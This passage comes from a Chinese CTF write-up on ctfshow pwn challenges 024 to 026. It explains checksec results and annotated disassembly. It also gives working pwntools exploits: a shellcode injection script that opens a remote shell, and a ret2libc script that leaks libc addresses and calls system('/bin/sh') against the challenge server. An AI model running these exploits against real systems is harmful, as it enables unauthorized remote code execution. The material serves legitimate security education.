<code>argv</code> 的第一个元素中（即 <code>argv[0]</code>）。</p><p>如果程序接收到了额外的命令行参数，这些参数会存储在 <code>argv</code> 数组的其余部分。例如，如果你在命令行中这样运行一个名为 <code>myProgram</code> 的程序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">myProgram arg1 arg2 arg3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么 <code>argv</code> 数组就会包含以下的元素：</p><ul><li><code>argv[0]</code>：<code>"myProgram"</code></li><li><code>argv[1]</code>：<code>"arg1"</code></li><li><code>argv[2]</code>：<code>"arg2"</code></li><li><code>argv[3]</code>：<code>"arg3"</code></li></ul><p><code>argv</code> 数组总是以一个 <code>NULL</code> 指针作为结束标记，所以 <code>argv[argc]</code> 是 <code>NULL</code>。</p><p>在代码中，如果命令行参数的数量（由 <code>argc</code> 表示）大于 1，那么 <code>argv[1]</code> 就会被作为参数传递给 <code>ctfshow</code> 函数。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230719225615852.png" alt="image-20230719225615852"></p><h2 id="十二、pwn024"><a href="#十二、pwn024" class="headerlink" title="十二、pwn024"></a>十二、pwn024</h2><h3 id="checksec分析"><a href="#checksec分析" class="headerlink" title="checksec分析"></a>checksec分析</h3><ol><li><p><code>Arch: i386-32-little</code>：这个表示该程序是一个 32 位程序，使用的是小端字节序。</p></li><li><p><code>RELRO: Partial RELRO</code>：RELRO（Relocation Read-Only）是一种防止程序重定向动态链接函数和防止 GOT（全局偏移表）被覆写的安全策略。这里的 Partial RELRO 表示开启了部分 RELRO，GOT 表仍然可以被覆写。</p></li><li><p><code>Stack: No canary found</code>：这表示该程序没有启用栈保护（也就是没有堆栈 Canary），因此可能容易遭受到缓冲区溢出的攻击。</p></li><li><p><code>NX: NX disabled</code>：NX (Non-eXecutable)，也被称为 XN (eXecute Never)，是一种保护措施，它可以设定某些内存区域（比如栈和堆）为不可执行，从而防止恶意代码在这些区域执行。这里的 NX disabled 表示程序的栈和堆区域可执行，可能被用于执行 Shellcode。</p></li><li><p><code>PIE: No PIE (0x8048000)</code>：PIE (Position Independent Executable) 表示程序的执行文件可以在内存中任何位置执行，配合 ASLR (Address Space Layout Randomization)，可以提高安全性。这里的 No PIE 表示该程序未启用 PIE，内存布局相对固定，有可能被利用。</p></li><li><p><code>RWX: Has RWX segments</code>：这表示该程序有一些内存段同时具有读、写、执行权限，可能被用来插入和执行 Shellcode。</p></li></ol><p>根据以上分析，这个程序可能具有较多的安全漏洞，比如缓冲区溢出、GOT 覆写、可执行 Shellcode 等。在进行漏洞利用时，应考虑这些情况。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726020658587.png" alt="image-20230726020658587"></p><h3 id="main汇编源代码"><a href="#main汇编源代码" class="headerlink" title="main汇编源代码"></a>main汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame fuzzy-sp; 这是一个基于基指针（bp）的栈帧，具有模糊的栈指针。; int __cdecl main(int argc, const char **argv, const char **envp); 这是一个名为 main 的函数，它采用 __cdecl 调用约定，输入参数是 argc, argv 和 envp。public main; 这将 main 函数标记为公开的，可以被其他模块调用。main proc near; 开始定义 main 函数。argc= dword ptr  8; 定义一个双字型指针 argc，位置在基指针(bp)向上偏移 8。argv= dword ptr  0Ch; 定义一个双字型指针 argv，位置在基指针(bp)向上偏移 0xC。envp= dword ptr  10h; 定义一个双字型指针 envp，位置在基指针(bp)向上偏移 0x10。lea     ecx, [esp+4]; 将 esp+4（也就是 argv 的地址）加载到 ecx 中。and     esp, 0FFFFFFF0h; 将 esp 和 0xFFFFFF0 进行按位与操作。这将使 esp 的值变为 16 的倍数，也就是按 16 字节对齐。push    dword ptr [ecx-4]; 将 [ecx-4]（也就是 argc）的值压入栈中。push    ebp; 将 ebp 的值压入栈中，保存旧的栈帧。mov     ebp, esp; 将 esp 的值赋给 ebp，创建新的栈帧。push    ebx; 将 ebx 的值压入栈中，以备后用。push    ecx; 将 ecx 的值压入栈中，以备后用。call    __x86_get_pc_thunk_bx; 获取当前的程序计数器 (pc)，并将其保存在 ebx 寄存器中。这是处理位置无关代码 (PIC) 的常见做法。add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); 将全局偏移表 (_GLOBAL_OFFSET_TABLE_) 的地址添加到 ebx 中，从而 ebx 指向全局偏移表。mov     eax, ds:(stdin_ptr - 804A000h)[ebx]; 将 ds 段中的 stdin_ptr - 0x804A000 加到 ebx 上，并将结果保存在 eax 中。这是获取 stdin 的文件指针的方式。mov     eax, [eax]; 将 eax 指向的内存值（即 stdin 的文件指针）加载到 eax 中。push    0               ; n; 将 0 压入栈，这将被用作 setvbuf 函数的 n 参数。push    1               ; modes; 将 1 压入栈，这将被用作 setvbuf 函数的 modes 参数。push    0               ; buf; 将 0 压入栈，这将被用作 setvbuf 函数的 buf 参数。push    eax             ; stream; 将 eax（也就是 stdin 的文件指针）压入栈，这将被用作 setvbuf 函数的 stream 参数。call    _setvbuf; 调用 setvbuf 函数，设置 stdin 的缓冲区。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。mov     eax, ds:(stdout_ptr - 804A000h)[ebx]; 将 ds 段中的 stdout_ptr - 0x804A000 加到 ebx 上，并将结果保存在 eax 中。这是获取 stdout 的文件指针的方式。mov     eax, [eax]; 将 eax 指向的内存值（即 stdout 的文件指针）加载到 eax 中。push    0               ; n; 将 0 压入栈，这将被用作 setvbuf 函数的 n 参数。push    2               ; modes; 将 2 压入栈，这将被用作 setvbuf 函数的 modes 参数。push    0               ; buf; 将 0 压入栈，这将被用作 setvbuf 函数的 buf 参数。push    eax             ; stream; 将 eax（也就是 stdout 的文件指针）压入栈，这将被用作 setvbuf 函数的 stream 参数。call    _setvbuf; 调用 setvbuf 函数，设置 stdout 的缓冲区。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_80486E0 - 804A000h)[ebx] ; "    "; 将字符串 "    " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048754 - 804A000h)[ebx] ; "  "; 将字符串 "  " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "  " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "  "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_80487D0 - 804A000h)[ebx] ; " "; 将字符串 " " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 " " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 " "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_804885C - 804A000h)[ebx] ; " "; 将字符串 " " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 " " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 " "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_80488EC - 804A000h)[ebx] ; " "; 将字符串 " " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 " " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 " "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048970 - 804A000h)[ebx] ; "  "; 将字符串 "  " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "  " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "  "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048A04 - 804A000h)[ebx] ; "    "; 将字符串 "    " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048A80 - 804A000h)[ebx] ; "    * *********************************"; 将字符串 "    * *********************************" 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * *********************************" 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * *********************************".add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aClassifyCtfsho - 804A000h)[ebx] ; "    * Classify: CTFshow --- PWN --- "; 将字符串 "    * Classify: CTFshow --- PWN --- " 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Classify: CTFshow --- PWN --- " 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Classify: CTFshow --- PWN --- "。add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aTypeLinuxSecur - 804A000h)[ebx] ; "    * Type  : Linux_Security_Mechanisms"...; 将字符串 "    * Type  : Linux_Security_Mechanisms"... 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Type  : Linux_Security_Mechanisms"... 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Type  : Linux_Security_Mechanisms"...add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aSiteHttpsCtfSh - 804A000h)[ebx] ; "    * Site  : https://ctf.show/        "...; 将字符串 "    * Site  : https://ctf.show/        "... 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Site  : https://ctf.show/        "... 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Site  : https://ctf.show/        "...add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (aHintNxDisabled - 804A000h)[ebx] ; "    * Hint  : NX disabled &amp; Has RWX seg"...; 将字符串 "    * Hint  : NX disabled &amp; Has RWX seg"... 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * Hint  : NX disabled &amp; Has RWX seg"... 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * Hint  : NX disabled &amp; Has RWX seg"...add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。sub     esp, 0Ch; 将 esp 向下移动 0xC，以预留空间。lea     eax, (asc_8048A80 - 804A000h)[ebx] ; "    * *********************************"; 将字符串 "    * *********************************" 的地址加载到 eax 中。push    eax             ; s; 将 eax（也就是字符串 "    * *********************************" 的地址）压入栈，这将被用作 puts 函数的 s 参数。call    _puts; 调用 puts 函数，打印字符串 "    * *********************************".add     esp, 10h; 将 esp 向上移动 0x10，以清理栈。call    ctfshow; 调用 ctfshow 函数。mov     eax, 0; 将 eax 设置为 0。lea     esp, [ebp-8]; 将 esp 设置为 ebp - 8。pop     ecx; 从栈中弹出一个值到 ecx。pop     ebx; 从栈中弹出一个值到 ebx。pop     ebp; 从栈中弹出一个值到 ebp。lea     esp, [ecx-4]; 将 esp 设置为 ecx - 4。retn; 返回到调用者。; } // starts at 8048514main endp; 结束 main 函数。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ctfshow汇编源代码"><a href="#ctfshow汇编源代码" class="headerlink" title="ctfshow汇编源代码"></a>ctfshow汇编源代码</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; Attributes: bp-based frame; 这个函数使用基于基指针 (bp) 的栈帧; int __cdecl ctfshow(_DWORD); 这是一个名为 ctfshow 的函数，它采用了 __cdecl 调用约定，输入是一个无符号的 32 位整数。public ctfshow; 这将 ctfshow 函数标记为公开的，这意味着其他模块可以调用它。ctfshow proc near; 开始定义 ctfshow 函数。buf= byte ptr -88h; 定义一个字节型指针 buf，位置在基指针(bp)向下偏移 0x88。var_4= dword ptr -4; 定义一个双字型指针 var_4，位置在基指针(bp)向下偏移 4。push    ebp; 将基指针 (ebp) 压入栈中，保存老的栈帧。mov     ebp, esp; 将当前的栈顶 (esp) 设置为新的栈帧基指针 (ebp)。push    ebx; 将 ebx 寄存器的值压入栈中，以备后用。sub     esp, 84h; 在栈顶 (esp) 向下偏移 0x84，以预留空间。call    __x86_get_pc_thunk_bx; 获取当前的程序计数器 (pc)，并将其保存在 ebx 寄存器中。通常用于处理位置无关代码 (PIC)。add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $); 将全局偏移表 (_GLOBAL_OFFSET_TABLE_) 的地址添加到 ebx 中，从而 ebx 指向全局偏移表。sub     esp, 4; 在栈顶 (esp) 向下偏移 4，以预留空间。push    100h            ; nbytes; 将 0x100 (256) 压入栈，这将被用作 read 函数的 nbytes 参数。lea     eax, [ebp+buf]; 将 ebp + buf (也就是 buf 的地址) 加载到 eax 中，这将被用作 read 函数的 buf 参数。push    eax             ; buf; 将 buf 的地址压入栈。push    0               ; fd; 将文件描述符 0 (标准输入) 压入栈，这将被用作 read 函数的 fd 参数。call    _read; 调用 read 函数，从标准输入读取数据到 buf 中。add     esp, 10h; 将栈顶 (esp) 向上偏移 0x10，用以清理栈。sub     esp, 0Ch; 将栈顶 (esp) 向下偏移 0xC，以预留空间。lea     eax, [ebp+buf]; 将 ebp + buf (也就是 buf 的地址) 加载到 eax 中，这将被用作 puts 函数的 s 参数。push    eax             ; s; 将 s 的地址压入栈。call    _puts; 调用 puts 函数，将 buf 的内容输出。add     esp, 10h; 将栈顶 (esp) 向上偏移 0x10，用以清理栈。lea     eax, [ebp+buf]; 将 ebp + buf (也就是 buf 的地址) 加载到 eax 中。call    eax; 调用 eax 指向的函数，也就是 buf 中的代码。这可能会引发缓冲区溢出。nop; 无操作。mov     ebx, [ebp+var_4]; 从内存中读取 [ebp+var_4] 的值到 ebx 寄存器。leave; 恢复上一个栈帧，等价于 "mov esp, ebp; pop ebp"。retn; 从函数返回。ctfshow endp; 结束 ctfshow 函数的定义。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>函数开始时进行一些栈操作，保存寄存器的值。</p></li><li><p>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</p></li><li><p>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</p></li><li><p>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</p></li><li><p>调用 puts 函数，将缓冲区的内容打印到标准输出。</p></li><li><p>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执</p></li></ol><p>行。</p><ol start="7"><li>之后是一些清理工作和函数返回的准备操作。</li></ol><p>可能这里看得还是云里雾里，后面慢慢会逐步清晰起来。但实际上这题题目提示了可以使用</p><p>pwntools的shellcraft模块进行攻击</p><p>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</p><p>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</p><p>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode。</p><h4 id="lea-eax-ebp-buf-中S参数解析"><a href="#lea-eax-ebp-buf-中S参数解析" class="headerlink" title="lea     eax, [ebp+buf]  中S参数解析"></a>lea     eax, [ebp+buf]  中S参数解析</h4><p>在这段代码中，<code>lea eax, [ebp+buf]</code> 这条指令的作用是将 ebp 加上偏移量 buf 的结果加载到 eax 中。在这里，buf 是一个在栈中的局部变量，所以 <code>ebp+buf</code> 指向的就是这个变量在内存中的地址。然后，这个地址被存储在 eax 中。</p><p>接下来，这个地址被用作 puts 函数的参数。在 C 语言中，puts 函数的原型是 <code>int puts(const char *s)</code>，这意味着 puts 函数需要一个指向字符数组（即字符串）的指针作为参数。这个参数在这里被称为 “s 地址”。</p><p>所以，在这个上下文中，”s 地址” 就是指向你想要打印的字符串的地址。换句话说，它就是你要 puts 函数打印的字符串在内存中的位置。在这段代码中，字符串是在 buf 中存储的，所以 <code>lea eax, [ebp+buf]</code> 这条指令就是在获取这个字符串的地址，然后将其传递给 puts 函数进行打印\1. 函数开始时进行一些栈操作，保存寄存器的值。</p><h3 id="（一）漏洞产生"><a href="#（一）漏洞产生" class="headerlink" title="（一）漏洞产生"></a>（一）漏洞产生</h3><p>从给出的代码片段来看，这个程序中的漏洞可能出现在 <code>ctfshow</code> 函数中，具体的错误是缓冲区溢出（buffer overflow）和任意代码执行。这是因为该函数接收的输入大小没有被正确限制，并且接收的输入会被作为代码执行。</p><p>详细来说，漏洞在下列代码部分出现：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">push    100h            ; nbyteslea     eax, [ebp+buf]push    eax             ; bufpush    0               ; fdcall    _read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这段代码中，<code>_read</code> 函数从文件描述符 <code>0</code>（也就是标准输入）读取 <code>100h</code>（也就是 256）字节的数据，并将其存储在 <code>buf</code> 中。然而 <code>buf</code> 的大小是 <code>88h</code>（也就是 136）字节，这就造成了缓冲区溢出。因为 <code>_read</code> 函数会读取比 <code>buf</code> 更多的数据，所以超过 <code>buf</code> 大小的部分会覆盖其他内存区域，这个就是缓冲区溢出漏洞。</p><p>此外，另一个漏洞出现在：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea     eax, [ebp+buf]call    eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在这段代码中，<code>call eax</code> 试图执行存在于 <code>buf</code> 的代码。由于之前的缓冲区溢出漏洞，攻击者可以控制这个缓冲区的内容，从而控制程序的执行流程。这就是任意代码执行漏洞。</p><p>这种类型的漏洞通常出现的原因是程序员在处理用户输入时未进行正确的边界检查。处理用户输入是编程中的一个重要且常见的任务，但如果不正确地进行，就很容易引入安全漏洞。在这个例子中，程序员应该限制 <code>_read</code> 函数读取的数据量，使其不超过 <code>buf</code> 的大小，并且不应该试图执行用户提供的数据。</p><h3 id="（二）exp-py"><a href="#（二）exp-py" class="headerlink" title="（二）exp.py"></a>（二）exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level = 'debug'io=remote("pwn.challenge.ctf.show", 28148)payload=asm(shellcraft.sh())io.sendline(payload)io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，目标程序存在一个典型的安全漏洞：它接收用户的输入，并试图将这个输入作为代码执行。如果攻击者可以控制这个输入，那么他们就可以执行任意代码，这就是常见的缓冲区溢出漏洞。</p><p>为了利用这个漏洞，攻击者需要提供一段将被执行的代码，这就是 shellcode 的由来。在这个示例中，攻击者希望弹出一个 shell，所以他们需要一个能够执行 shell 的 shellcode。</p><p>Python 脚本首先使用 pwntools 的 <code>shellcraft.sh()</code> 函数生成这个 shellcode。这个函数生成一段在目标系统上执行 shell 的代码，这个代码在 Linux 系统上通常会执行 <code>/bin/sh</code>。然后 <code>asm</code> 函数将这个 shellcode 从汇编代码转换为可以在目标系统上执行的机器代码。</p><p>接下来，脚本使用 pwntools 的 <code>remote</code> 函数连接到目标服务器。这个函数需要两个参数：目标服务器的地址和端口号。脚本通过这个连接将生成的 shellcode 发送到目标服务器。</p><p>当目标服务器接收到这个 shellcode 后，目标程序的漏洞就会被触发：程序会尝试执行接收到的数据作为代码。由于数据实际上是攻击者提供的 shellcode，所以这就导致了一个 shell 被弹出。</p><p>最后，脚本使用 pwntools 的 <code>interactive</code> 函数，使 Python 脚本的输入输出转换为交互式的。这样就允许攻击者通过 Python 脚本的控制台来操作在目标服务器上弹出的 shell，执行任意命令。</p><p>总的来说，这个脚本的工作原理是：生成 shellcode，连接到目标服务器，发送 shellcode，触发漏洞，然后控制弹出的 shell。这个方法依赖于目标程序的具体漏洞，以及 pwntools 库提供的方便的工具。</p><h2 id="十三、pwn025（NX保护ret2libc）"><a href="#十三、pwn025（NX保护ret2libc）" class="headerlink" title="十三、pwn025（NX保护ret2libc）"></a>十三、pwn025（NX保护ret2libc）</h2><h3 id="（一）mainC源代码"><a href="#（一）mainC源代码" class="headerlink" title="（一）mainC源代码"></a>（一）mainC源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  setvbuf(stdin, 0, 1, 0); //这是一个库函数，用于改变stdin（标准输入）的缓冲方式。在这里，第二个参数是NULL，表示不使用缓冲；第三个参数是1，表示设置为行缓冲方式；第四个参数是缓冲区大小，这里为0，因为不使用缓冲。  setvbuf(stdout, 0, 2, 0);//这也是一个库函数，用于改变stdout（标准输出）的缓冲方式。在这里，第二个参数是NULL，表示不使用缓冲；第三个参数是2，表示设置为全缓冲；第四个参数是缓冲区大小，这里为0，因为不使用缓冲。  ctfshow(&amp;argc);  logo();  write(0, "Hello CTFshow!\n", 0xEu);//这是一个系统调用，用于写入数据到文件描述符。在这里，0是文件描述符，表示标准输入；"Hello CTFshow!\n"是要写入的数据；0xEu是数据的长度，0xEu是十六进制表示，等于十进制的14。  return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t ctfshow(){  char buf[132]; // [esp+0h] [ebp-88h] BYREF  return read(0, buf, 0x100u);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（二）exp-py-ret2libc-攻击方法"><a href="#（二）exp-py-ret2libc-攻击方法" class="headerlink" title="（二）exp.py                (ret2libc     攻击方法)"></a>（二）exp.py                (ret2libc     攻击方法)</h3><p>首先，NX，全称No-eXecute，也叫做DEP（Data Execution Prevention，数据执行防止），是一种安全机制，用于防止恶意软件通过注入代码到数据段或堆栈段来执行恶意代码。它可以将内存标记为非可执行，这样处理器就不会在这些区域执行代码。这个机制可以有效防止缓冲区溢出攻击。</p><p>然后，ret2libc是一种绕过NX保护的攻击方法。由于NX保护阻止在非执行内存（如堆和栈）上执行代码，攻击者不能简单地插入并执行恶意代码。但是，攻击者可以利用已经存在的可执行代码片段，这些代码片段就是程序已经加载的库函数，例如C标准库libc。</p><p>在ret2libc攻击中，攻击者利用缓冲区溢出漏洞，改变返回地址，使其指向libc中的函数（如system），并在栈上布置参数。这样，当函数返回时，不会返回到原来的位置，而是跳转到libc的函数，执行攻击者预设的命令。这种攻击方法不需要在内存中注入新的代码，所以可以绕过NX保护。</p><p>所以，”开启NX保护，或许可以试试ret2libc”的意思是，如果目标系统开启了NX保护，可以考虑使用ret2libc这种攻击策略。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  # 导入 pwntools 库，它是一个用于CTF和二进制安全的Python库。from LibcSearcher import *  # 导入 LibcSearcher 库，它可以帮助找到正确的 libc 版本和寻找偏移。context.log_level = 'debug'  # 设置日志级别为 debug，将在运行时显示更详细的信息。#io = process('./pwn')  # 这行被注释掉了，如果运行，将在本地启动 pwn 程序。#io = remote('127.0.0.1',10000)  # 这行被注释掉了，如果运行，将连接本地的 10000 端口。io = remote("pwn.challenge.ctf.show", 28177)  # 连接远程服务器的 28177 端口。elf = ELF('./pwn')  # 读取 './pwn' 文件的 ELF 信息。main = elf.sym['main']  # 获取 'main' 函数的地址。write_got = elf.got['write']  # 获取 'write' 函数在 GOT 表中的地址。write_plt = elf.plt['write']  # 获取 'write' 函数在 PLT 表中的地址。# 构造并发送 payload，触发缓冲区溢出，并尝试执行 write 函数，然后返回到 main 函数。payload = cyclic(0x88+0x4) + p32(write_plt) + p32(main) + p32(0) + p32(write_got) + p32(4)io.sendline(payload)write = u32(io.recv(4))  # 接收 4 字节数据，并将其转化为无符号整型。这应该是运行时 'write' 函数的地址。print hex(write)  # 打印 write 函数的地址。libc = LibcSearcher('write',write)  # 使用 'write' 函数的地址，查找对应的 libc 版本。libc_base = write - libc.dump('write')  # 计算 libc 的基址。system = libc_base + libc.dump('system')  # 计算 'system' 函数的地址。bin_sh = libc_base + libc.dump('str_bin_sh')  # 计算 '/bin/sh' 字符串的地址。# 构造并发送新的 payload，再次触发缓冲区溢出，并尝试执行 system 函数打开一个 shell。payload = cyclic(0x88+0x4) + p32(system) + p32(main) + p32(bin_sh)io.sendline(payload)io.interactive()  # 进入交互模式，这样就可以手动输入命令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十四、pwn026"><a href="#十四、pwn026" class="headerlink" title="十四、pwn026"></a>十四、pwn026</h2><h3 id="（一）main函数C源代码"><a href="#（一）main函数C源代码" class="headerlink" title="（一）main函数C源代码"></a>（一）main函数C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){  void *ptr; // [rsp+0h] [rbp-10h] 分配用于保存堆内存分配指针的变量  void *v5; // [rsp+8h] [rbp-8h] 分配用于保存动态库加载地址的变量  ptr = malloc(4uLL); // 申请4字节的内存空间，将地址赋给ptr  v5 = dlopen("/lib/x86_64-linux-gnu/libc.so.6", 258); // 动态加载libc库，将库的地址赋给v5  puts(s); // 输出字符串s  puts(asc_4008F0); // 输出字符串asc_4008F0  puts(asc_400970); // 输出字符串asc_400970  puts(asc_400A00); // 输出字符串asc_400A00  puts(asc_400A90); // 输出字符串asc_400A90  